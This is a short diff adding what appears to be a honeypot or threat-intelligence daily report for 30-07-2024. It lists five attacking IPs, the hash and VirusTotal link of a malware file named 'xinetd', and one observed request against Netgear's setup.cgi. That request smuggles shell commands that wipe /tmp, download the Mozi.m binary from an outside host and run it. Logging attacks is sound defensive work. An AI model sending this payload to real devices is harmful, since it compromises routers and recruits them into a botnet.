@@ -1,0 +1,19 @@
+Top 5 IPs for 30-07-2024 :
+
+192.3.10.31
+43.136.95.69
+49.249.156.130
+118.145.130.5
+103.171.149.149
+
+Malware Observed:
+
+File name : xinetd
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+
+
+
+Commands/exploits observed:
+
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://46.32.172.201:11728/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
